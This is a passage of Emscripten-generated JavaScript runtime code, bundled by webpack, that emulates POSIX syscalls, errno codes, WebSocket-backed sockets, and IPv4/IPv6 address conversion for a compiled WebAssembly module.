                                getStreamFromFD: function (fd) {
                                    var stream = FS.getStream(fd);
                                    if (!stream) throw new FS.ErrnoError(8);
                                    return stream;
                                },
                                get64: function (low, high) {
                                    return low;
                                },
                            };
                        function ___sys__newselect(nfds, readfds, writefds, exceptfds, timeout) {
                            try {
                                for (
                                    var total = 0,
                                        srcReadLow = readfds ? HEAP32[readfds >> 2] : 0,
                                        srcReadHigh = readfds ? HEAP32[(readfds + 4) >> 2] : 0,
                                        srcWriteLow = writefds ? HEAP32[writefds >> 2] : 0,
                                        srcWriteHigh = writefds ? HEAP32[(writefds + 4) >> 2] : 0,
                                        srcExceptLow = exceptfds ? HEAP32[exceptfds >> 2] : 0,
                                        srcExceptHigh = exceptfds ? HEAP32[(exceptfds + 4) >> 2] : 0,
                                        dstReadLow = 0,
                                        dstReadHigh = 0,
                                        dstWriteLow = 0,
                                        dstWriteHigh = 0,
                                        dstExceptLow = 0,
                                        dstExceptHigh = 0,
                                        allLow = (readfds ? HEAP32[readfds >> 2] : 0) | (writefds ? HEAP32[writefds >> 2] : 0) | (exceptfds ? HEAP32[exceptfds >> 2] : 0),
                                        allHigh = (readfds ? HEAP32[(readfds + 4) >> 2] : 0) | (writefds ? HEAP32[(writefds + 4) >> 2] : 0) | (exceptfds ? HEAP32[(exceptfds + 4) >> 2] : 0),
                                        check = function (fd, low, high, val) {
                                            return fd < 32 ? low & val : high & val;
                                        },
                                        fd = 0;
                                    fd < nfds;
                                    fd++
                                ) {
                                    var mask = 1 << fd % 32;
                                    if (check(fd, allLow, allHigh, mask)) {
                                        var stream = FS.getStream(fd);
                                        if (!stream) throw new FS.ErrnoError(8);
                                        var flags = SYSCALLS.DEFAULT_POLLMASK;
                                        stream.stream_ops.poll && (flags = stream.stream_ops.poll(stream)),
                                            1 & flags && check(fd, srcReadLow, srcReadHigh, mask) && (fd < 32 ? (dstReadLow |= mask) : (dstReadHigh |= mask), total++),
                                            4 & flags && check(fd, srcWriteLow, srcWriteHigh, mask) && (fd < 32 ? (dstWriteLow |= mask) : (dstWriteHigh |= mask), total++),
                                            2 & flags && check(fd, srcExceptLow, srcExceptHigh, mask) && (fd < 32 ? (dstExceptLow |= mask) : (dstExceptHigh |= mask), total++);
                                    }
                                }
                                return (
                                    readfds && ((HEAP32[readfds >> 2] = dstReadLow), (HEAP32[(readfds + 4) >> 2] = dstReadHigh)),
                                    writefds && ((HEAP32[writefds >> 2] = dstWriteLow), (HEAP32[(writefds + 4) >> 2] = dstWriteHigh)),
                                    exceptfds && ((HEAP32[exceptfds >> 2] = dstExceptLow), (HEAP32[(exceptfds + 4) >> 2] = dstExceptHigh)),
                                    total
                                );
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        var ERRNO_CODES = {
                                EPERM: 63,
                                ENOENT: 44,
                                ESRCH: 71,
                                EINTR: 27,
                                EIO: 29,
                                ENXIO: 60,
                                E2BIG: 1,
                                ENOEXEC: 45,
                                EBADF: 8,
                                ECHILD: 12,
                                EAGAIN: 6,
                                EWOULDBLOCK: 6,
                                ENOMEM: 48,
                                EACCES: 2,
                                EFAULT: 21,
                                ENOTBLK: 105,
                                EBUSY: 10,
                                EEXIST: 20,
                                EXDEV: 75,
                                ENODEV: 43,
                                ENOTDIR: 54,
                                EISDIR: 31,
                                EINVAL: 28,
                                ENFILE: 41,
                                EMFILE: 33,
                                ENOTTY: 59,
                                ETXTBSY: 74,
                                EFBIG: 22,
                                ENOSPC: 51,
                                ESPIPE: 70,
                                EROFS: 69,
                                EMLINK: 34,
                                EPIPE: 64,
                                EDOM: 18,
                                ERANGE: 68,
                                ENOMSG: 49,
                                EIDRM: 24,
                                ECHRNG: 106,
                                EL2NSYNC: 156,
                                EL3HLT: 107,
                                EL3RST: 108,
                                ELNRNG: 109,
                                EUNATCH: 110,
                                ENOCSI: 111,
                                EL2HLT: 112,
                                EDEADLK: 16,
                                ENOLCK: 46,
                                EBADE: 113,
                                EBADR: 114,
                                EXFULL: 115,
                                ENOANO: 104,
                                EBADRQC: 103,
                                EBADSLT: 102,
                                EDEADLOCK: 16,
                                EBFONT: 101,
                                ENOSTR: 100,
                                ENODATA: 116,
                                ETIME: 117,
                                ENOSR: 118,
                                ENONET: 119,
                                ENOPKG: 120,
                                EREMOTE: 121,
                                ENOLINK: 47,
                                EADV: 122,
                                ESRMNT: 123,
                                ECOMM: 124,
                                EPROTO: 65,
                                EMULTIHOP: 36,
                                EDOTDOT: 125,
                                EBADMSG: 9,
                                ENOTUNIQ: 126,
                                EBADFD: 127,
                                EREMCHG: 128,
                                ELIBACC: 129,
                                ELIBBAD: 130,
                                ELIBSCN: 131,
                                ELIBMAX: 132,
                                ELIBEXEC: 133,
                                ENOSYS: 52,
                                ENOTEMPTY: 55,
                                ENAMETOOLONG: 37,
                                ELOOP: 32,
                                EOPNOTSUPP: 138,
                                EPFNOSUPPORT: 139,
                                ECONNRESET: 15,
                                ENOBUFS: 42,
                                EAFNOSUPPORT: 5,
                                EPROTOTYPE: 67,
                                ENOTSOCK: 57,
                                ENOPROTOOPT: 50,
                                ESHUTDOWN: 140,
                                ECONNREFUSED: 14,
                                EADDRINUSE: 3,
                                ECONNABORTED: 13,
                                ENETUNREACH: 40,
                                ENETDOWN: 38,
                                ETIMEDOUT: 73,
                                EHOSTDOWN: 142,
                                EHOSTUNREACH: 23,
                                EINPROGRESS: 26,
                                EALREADY: 7,
                                EDESTADDRREQ: 17,
                                EMSGSIZE: 35,
                                EPROTONOSUPPORT: 66,
                                ESOCKTNOSUPPORT: 137,
                                EADDRNOTAVAIL: 4,
                                ENETRESET: 39,
                                EISCONN: 30,
                                ENOTCONN: 53,
                                ETOOMANYREFS: 141,
                                EUSERS: 136,
                                EDQUOT: 19,
                                ESTALE: 72,
                                ENOTSUP: 138,
                                ENOMEDIUM: 148,
                                EILSEQ: 25,
                                EOVERFLOW: 61,
                                ECANCELED: 11,
                                ENOTRECOVERABLE: 56,
                                EOWNERDEAD: 62,
                                ESTRPIPE: 135,
                            },
                            SOCKFS = {
                                mount: function (mount) {
                                    return (
                                        (Module.websocket = Module.websocket && "object" == typeof Module.websocket ? Module.websocket : {}),
                                        (Module.websocket._callbacks = {}),
                                        (Module.websocket.on = function (event, callback) {
                                            return "function" == typeof callback && (this._callbacks[event] = callback), this;
                                        }),
                                        (Module.websocket.emit = function (event, param) {
                                            "function" == typeof this._callbacks[event] && this._callbacks[event].call(this, param);
                                        }),
                                        FS.createNode(null, "/", 16895, 0)
                                    );
                                },
                                createSocket: function (family, type, protocol) {
                                    (type &= -526337), protocol && assert((1 == type) == (6 == protocol));
                                    var sock = { family: family, type: type, protocol: protocol, server: null, error: null, peers: {}, pending: [], recv_queue: [], sock_ops: SOCKFS.websocket_sock_ops },
                                        name = SOCKFS.nextname(),
                                        node = FS.createNode(SOCKFS.root, name, 49152, 0);
                                    node.sock = sock;
                                    var stream = FS.createStream({ path: name, node: node, flags: 2, seekable: !1, stream_ops: SOCKFS.stream_ops });
                                    return (sock.stream = stream), sock;
                                },
                                getSocket: function (fd) {
                                    var stream = FS.getStream(fd);
                                    return stream && FS.isSocket(stream.node.mode) ? stream.node.sock : null;
                                },
                                stream_ops: {
                                    poll: function (stream) {
                                        var sock = stream.node.sock;
                                        return sock.sock_ops.poll(sock);
                                    },
                                    ioctl: function (stream, request, varargs) {
                                        var sock = stream.node.sock;
                                        return sock.sock_ops.ioctl(sock, request, varargs);
                                    },
                                    read: function (stream, buffer, offset, length, position) {
                                        var sock = stream.node.sock,
                                            msg = sock.sock_ops.recvmsg(sock, length);
                                        return msg ? (buffer.set(msg.buffer, offset), msg.buffer.length) : 0;
                                    },
                                    write: function (stream, buffer, offset, length, position) {
                                        var sock = stream.node.sock;
                                        return sock.sock_ops.sendmsg(sock, buffer, offset, length);
                                    },
                                    close: function (stream) {
                                        var sock = stream.node.sock;
                                        sock.sock_ops.close(sock);
                                    },
                                },
                                nextname: function () {
                                    return SOCKFS.nextname.current || (SOCKFS.nextname.current = 0), "socket[" + SOCKFS.nextname.current++ + "]";
                                },
                                websocket_sock_ops: {
                                    createPeer: function (sock, addr, port) {
                                        var ws;
                                        if (("object" == typeof addr && ((ws = addr), (addr = null), (port = null)), ws))
                                            if (ws._socket) (addr = ws._socket.remoteAddress), (port = ws._socket.remotePort);
                                            else {
                                                var result = /ws[s]?:\/\/([^:]+):(\d+)/.exec(ws.url);
                                                if (!result) throw new Error("WebSocket URL must be in the format ws(s)://address:port");
                                                (addr = result[1]), (port = parseInt(result[2], 10));
                                            }
                                        else
                                            try {
                                                var runtimeConfig = Module.websocket && "object" == typeof Module.websocket,
                                                    url = "ws:#".replace("#", "//");
                                                if ((runtimeConfig && "string" == typeof Module.websocket.url && (url = Module.websocket.url), "ws://" === url || "wss://" === url)) {
                                                    var parts = addr.split("/");
                                                    url = url + parts[0] + ":" + port + "/" + parts.slice(1).join("/");
                                                }
                                                var subProtocols = "binary";
                                                runtimeConfig && "string" == typeof Module.websocket.subprotocol && (subProtocols = Module.websocket.subprotocol);
                                                var opts = void 0;
                                                "null" !== subProtocols && ((subProtocols = subProtocols.replace(/^ +| +$/g, "").split(/ *, */)), (opts = ENVIRONMENT_IS_NODE ? { protocol: subProtocols.toString() } : subProtocols)),
                                                    runtimeConfig && null === Module.websocket.subprotocol && ((subProtocols = "null"), (opts = void 0)),
                                                    ((ws = new (ENVIRONMENT_IS_NODE ? __webpack_require__(134) : WebSocket)(url, opts)).binaryType = "arraybuffer");
                                            } catch (e) {
                                                throw new FS.ErrnoError(ERRNO_CODES.EHOSTUNREACH);
                                            }
                                        var peer = { addr: addr, port: port, socket: ws, dgram_send_queue: [] };
                                        return (
                                            SOCKFS.websocket_sock_ops.addPeer(sock, peer),
                                            SOCKFS.websocket_sock_ops.handlePeerEvents(sock, peer),
                                            2 === sock.type &&
                                                void 0 !== sock.sport &&
                                                peer.dgram_send_queue.push(new Uint8Array([255, 255, 255, 255, "p".charCodeAt(0), "o".charCodeAt(0), "r".charCodeAt(0), "t".charCodeAt(0), (65280 & sock.sport) >> 8, 255 & sock.sport])),
                                            peer
                                        );
                                    },
                                    getPeer: function (sock, addr, port) {
                                        return sock.peers[addr + ":" + port];
                                    },
                                    addPeer: function (sock, peer) {
                                        sock.peers[peer.addr + ":" + peer.port] = peer;
                                    },
                                    removePeer: function (sock, peer) {
                                        delete sock.peers[peer.addr + ":" + peer.port];
                                    },
                                    handlePeerEvents: function (sock, peer) {
                                        var first = !0,
                                            handleOpen = function () {
                                                Module.websocket.emit("open", sock.stream.fd);
                                                try {
                                                    for (var queued = peer.dgram_send_queue.shift(); queued; ) peer.socket.send(queued), (queued = peer.dgram_send_queue.shift());
                                                } catch (e) {
                                                    peer.socket.close();
                                                }
                                            };
                                        function handleMessage(data) {
                                            if ("string" == typeof data) data = new TextEncoder().encode(data);
                                            else {
                                                if ((assert(void 0 !== data.byteLength), 0 == data.byteLength)) return;
                                                data = new Uint8Array(data);
                                            }
                                            var wasfirst = first;
                                            if (
                                                ((first = !1),
                                                wasfirst &&
                                                    10 === data.length &&
                                                    255 === data[0] &&
                                                    255 === data[1] &&
                                                    255 === data[2] &&
                                                    255 === data[3] &&
                                                    data[4] === "p".charCodeAt(0) &&
                                                    data[5] === "o".charCodeAt(0) &&
                                                    data[6] === "r".charCodeAt(0) &&
                                                    data[7] === "t".charCodeAt(0))
                                            ) {
                                                var newport = (data[8] << 8) | data[9];
                                                return SOCKFS.websocket_sock_ops.removePeer(sock, peer), (peer.port = newport), void SOCKFS.websocket_sock_ops.addPeer(sock, peer);
                                            }
                                            sock.recv_queue.push({ addr: peer.addr, port: peer.port, data: data }), Module.websocket.emit("message", sock.stream.fd);
                                        }
                                        ENVIRONMENT_IS_NODE
                                            ? (peer.socket.on("open", handleOpen),
                                              peer.socket.on("message", function (data, flags) {
                                                  flags.binary && handleMessage(new Uint8Array(data).buffer);
                                              }),
                                              peer.socket.on("close", function () {
                                                  Module.websocket.emit("close", sock.stream.fd);
                                              }),
                                              peer.socket.on("error", function (error) {
                                                  (sock.error = ERRNO_CODES.ECONNREFUSED), Module.websocket.emit("error", [sock.stream.fd, sock.error, "ECONNREFUSED: Connection refused"]);
                                              }))
                                            : ((peer.socket.onopen = handleOpen),
                                              (peer.socket.onclose = function () {
                                                  Module.websocket.emit("close", sock.stream.fd);
                                              }),
                                              (peer.socket.onmessage = function (event) {
                                                  handleMessage(event.data);
                                              }),
                                              (peer.socket.onerror = function (error) {
                                                  (sock.error = ERRNO_CODES.ECONNREFUSED), Module.websocket.emit("error", [sock.stream.fd, sock.error, "ECONNREFUSED: Connection refused"]);
                                              }));
                                    },
                                    poll: function (sock) {
                                        if (1 === sock.type && sock.server) return sock.pending.length ? 65 : 0;
                                        var mask = 0,
                                            dest = 1 === sock.type ? SOCKFS.websocket_sock_ops.getPeer(sock, sock.daddr, sock.dport) : null;
                                        return (
                                            (sock.recv_queue.length || !dest || (dest && dest.socket.readyState === dest.socket.CLOSING) || (dest && dest.socket.readyState === dest.socket.CLOSED)) && (mask |= 65),
                                            (!dest || (dest && dest.socket.readyState === dest.socket.OPEN)) && (mask |= 4),
                                            ((dest && dest.socket.readyState === dest.socket.CLOSING) || (dest && dest.socket.readyState === dest.socket.CLOSED)) && (mask |= 16),
                                            mask
                                        );
                                    },
                                    ioctl: function (sock, request, arg) {
                                        switch (request) {
                                            case 21531:
                                                var bytes = 0;
                                                return sock.recv_queue.length && (bytes = sock.recv_queue[0].data.length), (HEAP32[arg >> 2] = bytes), 0;
                                            default:
                                                return ERRNO_CODES.EINVAL;
                                        }
                                    },
                                    close: function (sock) {
                                        if (sock.server) {
                                            try {
                                                sock.server.close();
                                            } catch (e) {}
                                            sock.server = null;
                                        }
                                        for (var peers = Object.keys(sock.peers), i = 0; i < peers.length; i++) {
                                            var peer = sock.peers[peers[i]];
                                            try {
                                                peer.socket.close();
                                            } catch (e) {}
                                            SOCKFS.websocket_sock_ops.removePeer(sock, peer);
                                        }
                                        return 0;
                                    },
                                    bind: function (sock, addr, port) {
                                        if (void 0 !== sock.saddr || void 0 !== sock.sport) throw new FS.ErrnoError(ERRNO_CODES.EINVAL);
                                        if (((sock.saddr = addr), (sock.sport = port), 2 === sock.type)) {
                                            sock.server && (sock.server.close(), (sock.server = null));
                                            try {
                                                sock.sock_ops.listen(sock, 0);
                                            } catch (e) {
                                                if (!(e instanceof FS.ErrnoError)) throw e;
                                                if (e.errno !== ERRNO_CODES.EOPNOTSUPP) throw e;
                                            }
                                        }
                                    },
                                    connect: function (sock, addr, port) {
                                        if (sock.server) throw new FS.ErrnoError(ERRNO_CODES.EOPNOTSUPP);
                                        if (void 0 !== sock.daddr && void 0 !== sock.dport) {
                                            var dest = SOCKFS.websocket_sock_ops.getPeer(sock, sock.daddr, sock.dport);
                                            if (dest) throw dest.socket.readyState === dest.socket.CONNECTING ? new FS.ErrnoError(ERRNO_CODES.EALREADY) : new FS.ErrnoError(ERRNO_CODES.EISCONN);
                                        }
                                        var peer = SOCKFS.websocket_sock_ops.createPeer(sock, addr, port);
                                        throw ((sock.daddr = peer.addr), (sock.dport = peer.port), new FS.ErrnoError(ERRNO_CODES.EINPROGRESS));
                                    },
                                    listen: function (sock, backlog) {
                                        if (!ENVIRONMENT_IS_NODE) throw new FS.ErrnoError(ERRNO_CODES.EOPNOTSUPP);
                                        if (sock.server) throw new FS.ErrnoError(ERRNO_CODES.EINVAL);
                                        var WebSocketServer = __webpack_require__(134).Server,
                                            host = sock.saddr;
                                        (sock.server = new WebSocketServer({ host: host, port: sock.sport })),
                                            Module.websocket.emit("listen", sock.stream.fd),
                                            sock.server.on("connection", function (ws) {
                                                if (1 === sock.type) {
                                                    var newsock = SOCKFS.createSocket(sock.family, sock.type, sock.protocol),
                                                        peer = SOCKFS.websocket_sock_ops.createPeer(newsock, ws);
                                                    (newsock.daddr = peer.addr), (newsock.dport = peer.port), sock.pending.push(newsock), Module.websocket.emit("connection", newsock.stream.fd);
                                                } else SOCKFS.websocket_sock_ops.createPeer(sock, ws), Module.websocket.emit("connection", sock.stream.fd);
                                            }),
                                            sock.server.on("closed", function () {
                                                Module.websocket.emit("close", sock.stream.fd), (sock.server = null);
                                            }),
                                            sock.server.on("error", function (error) {
                                                (sock.error = ERRNO_CODES.EHOSTUNREACH), Module.websocket.emit("error", [sock.stream.fd, sock.error, "EHOSTUNREACH: Host is unreachable"]);
                                            });
                                    },
                                    accept: function (listensock) {
                                        if (!listensock.server) throw new FS.ErrnoError(ERRNO_CODES.EINVAL);
                                        var newsock = listensock.pending.shift();
                                        return (newsock.stream.flags = listensock.stream.flags), newsock;
                                    },
                                    getname: function (sock, peer) {
                                        var addr, port;
                                        if (peer) {
                                            if (void 0 === sock.daddr || void 0 === sock.dport) throw new FS.ErrnoError(ERRNO_CODES.ENOTCONN);
                                            (addr = sock.daddr), (port = sock.dport);
                                        } else (addr = sock.saddr || 0), (port = sock.sport || 0);
                                        return { addr: addr, port: port };
                                    },
                                    sendmsg: function (sock, buffer, offset, length, addr, port) {
                                        if (2 === sock.type) {
                                            if (((void 0 !== addr && void 0 !== port) || ((addr = sock.daddr), (port = sock.dport)), void 0 === addr || void 0 === port)) throw new FS.ErrnoError(ERRNO_CODES.EDESTADDRREQ);
                                        } else (addr = sock.daddr), (port = sock.dport);
                                        var data,
                                            dest = SOCKFS.websocket_sock_ops.getPeer(sock, addr, port);
                                        if (1 === sock.type) {
                                            if (!dest || dest.socket.readyState === dest.socket.CLOSING || dest.socket.readyState === dest.socket.CLOSED) throw new FS.ErrnoError(ERRNO_CODES.ENOTCONN);
                                            if (dest.socket.readyState === dest.socket.CONNECTING) throw new FS.ErrnoError(ERRNO_CODES.EAGAIN);
                                        }
                                        if (
                                            (ArrayBuffer.isView(buffer) && ((offset += buffer.byteOffset), (buffer = buffer.buffer)),
                                            (data = buffer.slice(offset, offset + length)),
                                            2 === sock.type && (!dest || dest.socket.readyState !== dest.socket.OPEN))
                                        )
                                            return (
                                                (dest && dest.socket.readyState !== dest.socket.CLOSING && dest.socket.readyState !== dest.socket.CLOSED) || (dest = SOCKFS.websocket_sock_ops.createPeer(sock, addr, port)),
                                                dest.dgram_send_queue.push(data),
                                                length
                                            );
                                        try {
                                            return dest.socket.send(data), length;
                                        } catch (e) {
                                            throw new FS.ErrnoError(ERRNO_CODES.EINVAL);
                                        }
                                    },
                                    recvmsg: function (sock, length) {
                                        if (1 === sock.type && sock.server) throw new FS.ErrnoError(ERRNO_CODES.ENOTCONN);
                                        var queued = sock.recv_queue.shift();
                                        if (!queued) {
                                            if (1 === sock.type) {
                                                var dest = SOCKFS.websocket_sock_ops.getPeer(sock, sock.daddr, sock.dport);
                                                if (dest) {
                                                    if (dest.socket.readyState === dest.socket.CLOSING || dest.socket.readyState === dest.socket.CLOSED) return null;
                                                    throw new FS.ErrnoError(ERRNO_CODES.EAGAIN);
                                                }
                                                throw new FS.ErrnoError(ERRNO_CODES.ENOTCONN);
                                            }
                                            throw new FS.ErrnoError(ERRNO_CODES.EAGAIN);
                                        }
                                        var queuedLength = queued.data.byteLength || queued.data.length,
                                            queuedOffset = queued.data.byteOffset || 0,
                                            queuedBuffer = queued.data.buffer || queued.data,
                                            bytesRead = Math.min(length, queuedLength),
                                            res = { buffer: new Uint8Array(queuedBuffer, queuedOffset, bytesRead), addr: queued.addr, port: queued.port };
                                        if (1 === sock.type && bytesRead < queuedLength) {
                                            var bytesRemaining = queuedLength - bytesRead;
                                            (queued.data = new Uint8Array(queuedBuffer, queuedOffset + bytesRead, bytesRemaining)), sock.recv_queue.unshift(queued);
                                        }
                                        return res;
                                    },
                                },
                            };
                        function getSocketFromFD(fd) {
                            var socket = SOCKFS.getSocket(fd);
                            if (!socket) throw new FS.ErrnoError(8);
                            return socket;
                        }
                        function inetPton4(str) {
                            for (var b = str.split("."), i = 0; i < 4; i++) {
                                var tmp = Number(b[i]);
                                if (isNaN(tmp)) return null;
                                b[i] = tmp;
                            }
                            return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
                        }
                        function jstoi_q(str) {
                            return parseInt(str);
                        }
                        function inetPton6(str) {
                            var words,
                                w,
                                offset,
                                z,
                                parts = [];
                            if (!/^((?=.*::)(?!.*::.+::)(::)?([\dA-F]{1,4}:(:|\b)|){5}|([\dA-F]{1,4}:){6})((([\dA-F]{1,4}((?!\3)::|:\b|$))|(?!\2\3)){2}|(((2[0-4]|1\d|[1-9])?\d|25[0-5])\.?\b){4})$/i.test(str)) return null;
                            if ("::" === str) return [0, 0, 0, 0, 0, 0, 0, 0];
                            for (
                                (str = str.startsWith("::") ? str.replace("::", "Z:") : str.replace("::", ":Z:")).indexOf(".") > 0
                                    ? (((words = (str = str.replace(new RegExp("[.]", "g"), ":")).split(":"))[words.length - 4] = jstoi_q(words[words.length - 4]) + 256 * jstoi_q(words[words.length - 3])),
                                      (words[words.length - 3] = jstoi_q(words[words.length - 2]) + 256 * jstoi_q(words[words.length - 1])),
                                      (words = words.slice(0, words.length - 2)))
                                    : (words = str.split(":")),
                                    offset = 0,
                                    z = 0,
                                    w = 0;
                                w < words.length;
                                w++
                            )
                                if ("string" == typeof words[w])
                                    if ("Z" === words[w]) {
                                        for (z = 0; z < 8 - words.length + 1; z++) parts[w + z] = 0;
                                        offset = z - 1;
                                    } else parts[w + offset] = _htons(parseInt(words[w], 16));
                                else parts[w + offset] = words[w];
                            return [(parts[1] << 16) | parts[0], (parts[3] << 16) | parts[2], (parts[5] << 16) | parts[4], (parts[7] << 16) | parts[6]];
                        }
                        function writeSockaddr(sa, family, addr, port, addrlen) {
                            switch (family) {
                                case 2:
                                    (addr = inetPton4(addr)),
                                        addrlen && (HEAP32[addrlen >> 2] = 16),
                                        (HEAP16[sa >> 1] = family),
                                        (HEAP32[(sa + 4) >> 2] = addr),
                                        (HEAP16[(sa + 2) >> 1] = _htons(port)),
                                        (tempI64 = [
                                            0,
                                            ((tempDouble = 0),
                                            +Math.abs(tempDouble) >= 1 ? (tempDouble > 0 ? (0 | Math.min(+Math.floor(tempDouble / 4294967296), 4294967295)) >>> 0 : ~~+Math.ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0) : 0),
                                        ]),
                                        (HEAP32[(sa + 8) >> 2] = tempI64[0]),
                                        (HEAP32[(sa + 12) >> 2] = tempI64[1]);
                                    break;
                                case 10:
                                    (addr = inetPton6(addr)),
                                        addrlen && (HEAP32[addrlen >> 2] = 28),
                                        (HEAP32[sa >> 2] = family),
                                        (HEAP32[(sa + 8) >> 2] = addr[0]),
                                        (HEAP32[(sa + 12) >> 2] = addr[1]),
                                        (HEAP32[(sa + 16) >> 2] = addr[2]),
                                        (HEAP32[(sa + 20) >> 2] = addr[3]),
                                        (HEAP16[(sa + 2) >> 1] = _htons(port)),
                                        (HEAP32[(sa + 4) >> 2] = 0),
                                        (HEAP32[(sa + 24) >> 2] = 0);
                                    break;
                                default:
                                    return 5;
                            }
                            return 0;
                        }
                        var DNS = {
                            address_map: { id: 1, addrs: {}, names: {} },
                            lookup_name: function (name) {
                                var addr,
                                    res = inetPton4(name);
                                if (null !== res) return name;
                                if (null !== (res = inetPton6(name))) return name;
                                if (DNS.address_map.addrs[name]) addr = DNS.address_map.addrs[name];
                                else {
                                    var id = DNS.address_map.id++;
                                    assert(id < 65535, "exceeded max address mappings of 65535"), (addr = "172.29." + (255 & id) + "." + (65280 & id)), (DNS.address_map.names[addr] = name), (DNS.address_map.addrs[name] = addr);
                                }
                                return addr;
                            },
                            lookup_addr: function (addr) {
                                return DNS.address_map.names[addr] ? DNS.address_map.names[addr] : null;
                            },
                        };
                        function ___sys_accept4(fd, addr, addrlen, flags) {
                            try {
                                var sock = getSocketFromFD(fd),
                                    newsock = sock.sock_ops.accept(sock);
                                return addr && writeSockaddr(addr, newsock.family, DNS.lookup_name(newsock.daddr), newsock.dport, addrlen), newsock.stream.fd;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_access(path, amode) {
                            try {
                                return (path = SYSCALLS.getStr(path)), SYSCALLS.doAccess(path, amode);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function inetNtop4(addr) {
                            return (255 & addr) + "." + ((addr >> 8) & 255) + "." + ((addr >> 16) & 255) + "." + ((addr >> 24) & 255);
                        }
                        function inetNtop6(ints) {
                            var str = "",
                                word = 0,
                                longest = 0,
                                lastzero = 0,
                                zstart = 0,
                                len = 0,
                                i = 0,
                                parts = [65535 & ints[0], ints[0] >> 16, 65535 & ints[1], ints[1] >> 16, 65535 & ints[2], ints[2] >> 16, 65535 & ints[3], ints[3] >> 16],
                                hasipv4 = !0,
                                v4part = "";
                            for (i = 0; i < 5; i++)
                                if (0 !== parts[i]) {
                                    hasipv4 = !1;
                                    break;
                                }
                            if (hasipv4) {
                                if (((v4part = inetNtop4(parts[6] | (parts[7] << 16))), -1 === parts[5])) return (str = "::ffff:"), (str += v4part);
                                if (0 === parts[5]) return (str = "::"), "0.0.0.0" === v4part && (v4part = ""), "0.0.0.1" === v4part && (v4part = "1"), (str += v4part);
                            }
                            for (word = 0; word < 8; word++) 0 === parts[word] && (word - lastzero > 1 && (len = 0), (lastzero = word), len++), len > longest && (zstart = word - (longest = len) + 1);
                            for (word = 0; word < 8; word++)
                                longest > 1 && 0 === parts[word] && word >= zstart && word < zstart + longest
                                    ? word === zstart && ((str += ":"), 0 === zstart && (str += ":"))
                                    : ((str += Number(_ntohs(65535 & parts[word])).toString(16)), (str += word < 7 ? ":" : ""));
                            return str;
                        }
                        function readSockaddr(sa, salen) {
                            var addr,
                                family = HEAP16[sa >> 1],
                                port = _ntohs(HEAPU16[(sa + 2) >> 1]);
                            switch (family) {
                                case 2:
                                    if (16 !== salen) return { errno: 28 };
                                    addr = inetNtop4((addr = HEAP32[(sa + 4) >> 2]));
                                    break;
                                case 10:
                                    if (28 !== salen) return { errno: 28 };
                                    addr = inetNtop6((addr = [HEAP32[(sa + 8) >> 2], HEAP32[(sa + 12) >> 2], HEAP32[(sa + 16) >> 2], HEAP32[(sa + 20) >> 2]]));
                                    break;
                                default:
                                    return { errno: 5 };
                            }
                            return { family: family, addr: addr, port: port };
                        }
                        function getSocketAddress(addrp, addrlen, allowNull) {
                            if (allowNull && 0 === addrp) return null;
                            var info = readSockaddr(addrp, addrlen);
                            if (info.errno) throw new FS.ErrnoError(info.errno);
                            return (info.addr = DNS.lookup_addr(info.addr) || info.addr), info;
                        }
                        function ___sys_bind(fd, addr, addrlen) {
                            try {
                                var sock = getSocketFromFD(fd),
                                    info = getSocketAddress(addr, addrlen);
                                return sock.sock_ops.bind(sock, info.addr, info.port), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_connect(fd, addr, addrlen) {
                            try {
                                var sock = getSocketFromFD(fd),
                                    info = getSocketAddress(addr, addrlen);
                                return sock.sock_ops.connect(sock, info.addr, info.port), 0;
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_fcntl64(fd, cmd, varargs) {
                            SYSCALLS.varargs = varargs;
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd);
                                switch (cmd) {
                                    case 0:
                                        return (arg = SYSCALLS.get()) < 0 ? -28 : FS.open(stream.path, stream.flags, 0, arg).fd;
                                    case 1:
                                    case 2:
                                        return 0;
                                    case 3:
                                        return stream.flags;
                                    case 4:
                                        var arg = SYSCALLS.get();
                                        return (stream.flags |= arg), 0;
                                    case 12:
                                        return (arg = SYSCALLS.get()), (HEAP16[(arg + 0) >> 1] = 2), 0;
                                    case 13:
                                    case 14:
                                        return 0;
                                    case 16:
                                    case 8:
                                        return -28;
                                    case 9:
                                        return setErrNo(28), -1;
                                    default:
                                        return -28;
                                }
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_fstat64(fd, buf) {
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd);
                                return SYSCALLS.doStat(FS.stat, stream.path, buf);
                            } catch (e) {
                                return (void 0 !== FS && e instanceof FS.ErrnoError) || abort(e), -e.errno;
                            }
                        }
                        function ___sys_getdents64(fd, dirp, count) {
                            try {
                                var stream = SYSCALLS.getStreamFromFD(fd);
                                stream.getdents || (stream.getdents = FS.readdir(stream.path));
                                for (var pos = 0, off = FS.llseek(stream, 0, 1), idx = Math.floor(off / 280); idx < stream.getdents.length && pos + 280 <= count; ) {
                                    var id,
                                        type,
                                        name = stream.getdents[idx];
                                    if ("." === name[0]) (id = 1), (type = 4);
                                    else {
                                        var child = FS.lookupNode(stream.node, name);
                                        (id = child.id), (type = FS.isChrdev(child.mode) ? 2 : FS.isDir(child.mode) ? 4 : FS.isLink(child.mode) ? 10 : 8);
                                    }
                                    (tempI64 = [
                                        id >>> 0,
                                        ((tempDouble = id),
                                        +Math.abs(tempDouble) >= 1 ? (tempDouble > 0 ? (0 | Math.min(+Math.floor(tempDouble / 4294967296), 4294967295)) >>> 0 : ~~+Math.ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0) : 0),
                                    ]),
                                        (HEAP32[(dirp + pos) >> 2] = tempI64[0]),
                                        (HEAP32[(dirp + pos + 4) >> 2] = tempI64[1]),
                                        (tempI64 = [
                                            (280 * (idx + 1)) >>> 0,
                                            ((tempDouble = 280 * (idx + 1)),
